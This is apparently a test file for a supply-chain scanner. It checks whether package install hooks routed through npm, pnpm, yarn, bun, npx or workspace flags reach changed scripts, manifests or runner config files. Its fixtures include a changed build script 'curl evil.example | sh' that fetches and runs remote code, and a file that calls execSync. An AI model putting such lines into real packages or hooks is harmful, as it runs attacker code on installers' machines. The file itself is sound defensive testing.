import { describe, expect, test } from "bun:test";
import { prepass, type FileMap } from "../src/prepass.ts";

const enc = new TextEncoder();
const map = (f: Record<string, string>): FileMap => new Map(Object.entries(f).map(([k, v]) => [k, enc.encode(v)]));
const pj = (scripts: object) => JSON.stringify({ name: "x", version: "1", scripts });
const SUB_OLD = { "sub/x.js": "1" };
const SUB_NEW = { "sub/x.js": "require('child_process').execSync('id')" };
const subManifest = (build: string) => ({ "sub/package.json": JSON.stringify({ name: "sub", version: "1", scripts: { build } }) });

// The hook names a runner form; only the given files change between old and new.
function held(scripts: object, oldFiles: Record<string, string>, newFiles: Record<string, string>): boolean {
  const base = { "package.json": pj(scripts) };
  return prepass("npm", map({ ...base, ...oldFiles }), map({ ...base, ...newFiles })).hard.some((s) => s.kind === "install-script");
}
const fileHeld = (hook: string) => held({ postinstall: hook, build: "echo ok", test: "echo ok" }, SUB_OLD, SUB_NEW);
const manifestHeld = (hook: string) => held({ postinstall: hook, build: "echo ok" }, subManifest("echo a"), subManifest("curl evil.example | sh"));

describe("a form that runs another package's script reads that package's manifest", () => {
  test("pnpm, yarn and bun workspace forms hold a changed script in another manifest", () => {
    for (const cmd of ["pnpm -C sub build", "pnpm --filter sub build", "pnpm -r build", "yarn workspace sub build", "yarn --cwd sub build", "bun --filter sub build", "bun run --workspaces build"]) {
      expect(manifestHeld(cmd), cmd).toBe(true);
    }
  });

  test("npm workspace forms and the wrapped forms hold it too", () => {
    for (const cmd of ["npm run build --prefix sub", "npm run build -w sub", "npx pnpm -C sub build", "corepack pnpm --filter sub build", "npx npm run build -w sub"]) {
      expect(manifestHeld(cmd), cmd).toBe(true);
    }
  });

  test("a form that stays in this package ignores another manifest", () => {
    for (const cmd of ["npm run build", "pnpm run build", "yarn build", "bun run build", "npm run build -- --prefix sub"]) {
      expect(manifestHeld(cmd), cmd).toBe(false);
    }
  });
});

describe("npm forms that leave this package hold", () => {
  test("--prefix, -C, -w, --workspace and --workspaces do not resolve to the local script", () => {
    for (const cmd of ["npm run build --prefix sub", "npm --prefix sub run build", "npm --prefix=sub run build", "npm -C sub run build", "npm run build -w sub", "npm run build --workspace=sub", "npm run build -ws", "npm run build --workspaces", "npm test -w sub", "npm run -w sub build", "npm --workspace sub run build", "npm run build --include-workspace-root"]) {
      expect(fileHeld(cmd), cmd).toBe(true);
    }
  });

  test("a flag after -- belongs to the script, and a plain run stays local", () => {
    for (const cmd of ["npm run build", "npm run build -- -w sub", "npm test", "npm run build --silent"]) {
      expect(fileHeld(cmd), cmd).toBe(false);
    }
  });
});

describe("an unknown flag before the script name holds", () => {
  test("yarn, pnpm, bun and npm do not guess what a flag takes", () => {
    for (const cmd of ["yarn run -T build", "yarn -T build", "pnpm run --foo build", "pnpm --bar build", "pnpm run -T build", "bun run --bun build", "npm run --foo build", "yarn run -- build"]) {
      expect(fileHeld(cmd), cmd).toBe(true);
    }
  });

  test("known quiet flags still resolve to the local script", () => {
    for (const cmd of ["yarn run --silent build", "pnpm run --if-present build", "bun run build", "yarn build"]) {
      expect(fileHeld(cmd), cmd).toBe(false);
    }
  });
});

describe("review round: pinned runners, exec forms, unresolved routes and .npmrc", () => {
  test("a version-pinned wrapped runner is recognized", () => {
    for (const cmd of ["npx pnpm@9 -C sub build", "corepack yarn@1.22.22 workspace sub build", "npx pnpm@9 --filter sub build"]) {
      expect(manifestHeld(cmd), cmd).toBe(true);
    }
  });

  test("bunx, npm exec and npx -c reach the wrapped runner", () => {
    for (const cmd of ["bunx pnpm -C sub build", "npm exec -- pnpm -C sub build", "npx -c 'pnpm -C sub build'"]) {
      expect(manifestHeld(cmd), cmd).toBe(true);
    }
  });

  test("every unresolved route reads the other manifests", () => {
    for (const cmd of ["cd sub && npm run build", "lerna run build", "npx lerna run build", "turbo run build", "npm_config_workspace=sub npm run build", "env npm_config_prefix=sub npm run build", "npm --userconfig ./rc run build"]) {
      expect(manifestHeld(cmd), cmd).toBe(true);
    }
  });

  test("a .npmrc in the package joins the surface and widens", () => {
    const scripts = { postinstall: "npm run build", build: "echo ok" };
    const oldF = { ".npmrc": "workspace=sub\n", ...subManifest("echo a") };
    expect(held(scripts, oldF, { ".npmrc": "workspace=sub\n", ...subManifest("curl evil.example | sh") })).toBe(true);
    expect(held(scripts, oldF, { ".npmrc": "workspace=other\n", ...subManifest("echo a") })).toBe(true);
    expect(held(scripts, subManifest("echo a"), subManifest("curl evil.example | sh"))).toBe(false);
  });
});

describe("a manifest under a test or docs folder is still read by a directory-changing form", () => {
  const nested = (dir: string, build: string) => ({ [`${dir}/package.json`]: JSON.stringify({ name: "n", version: "1", scripts: { build } }) });
  const cases: [string, string][] = [
    ["npm --prefix tests/pkg run build", "tests/pkg"],
    ["pnpm -C tests/pkg build", "tests/pkg"],
    ["yarn --cwd docs/pkg build", "docs/pkg"],
    ["npm run build -w test/pkg", "test/pkg"],
    ["cd __tests__/pkg && npm run build", "__tests__/pkg"],
  ];
  test("each form holds a changed nested manifest", () => {
    for (const [cmd, dir] of cases) {
      expect(held({ postinstall: cmd, build: "echo ok" }, nested(dir, "echo a"), nested(dir, "curl evil.example | sh")), cmd).toBe(true);
    }
  });
  test("the control under sub holds and an unchanged manifest does not", () => {
    expect(manifestHeld("npm --prefix sub run build")).toBe(true);
    expect(held({ postinstall: "npm --prefix tests/pkg run build", build: "echo ok" }, nested("tests/pkg", "echo a"), nested("tests/pkg", "echo a"))).toBe(false);
  });
});

describe("npm exec forms and runner config files", () => {
  test("npm exec and npm x hold a changed file the command reaches, remote or not", () => {
    for (const cmd of ["npm exec -- run-s setup", "npm x -- run-s setup", "npm exec -p evil-pkg -- node ./sub/x.js", "npm exec --package=evil-pkg -- node ./sub/x.js", "npm exec --call='node ./sub/x.js'", "npm exec -c='node ./sub/x.js'", "npm exec -c 'node ./sub/x.js'", "npm exec --call 'node ./sub/x.js'"]) {
      expect(held({ postinstall: cmd, setup: "node sub/x.js" }, SUB_OLD, SUB_NEW), cmd).toBe(true);
    }
  });

  test("npm exec with -c dispatches the call string to the wrapped runner", () => {
    for (const cmd of ["npm exec --call='pnpm -C sub build'", "npm exec -c='pnpm -C sub build'", "npm x -p pnpm -- pnpm -C sub build"]) {
      expect(manifestHeld(cmd), cmd).toBe(true);
    }
  });

  test("a changed runner config file with an install hook holds", () => {
    const scripts = { postinstall: "npm run build", build: "echo ok" };
    for (const f of [".npmrc", ".yarnrc.yml", ".yarnrc", "pnpm-workspace.yaml", ".pnpmfile.cjs", "bunfig.toml"]) {
      expect(held(scripts, { [f]: "a" }, { [f]: "b" }), f).toBe(true);
      expect(held(scripts, { [f]: "a" }, { [f]: "a" }), f).toBe(false);
      expect(held(scripts, {}, { [f]: "b" }), `added ${f}`).toBe(true);
    }
  });
});
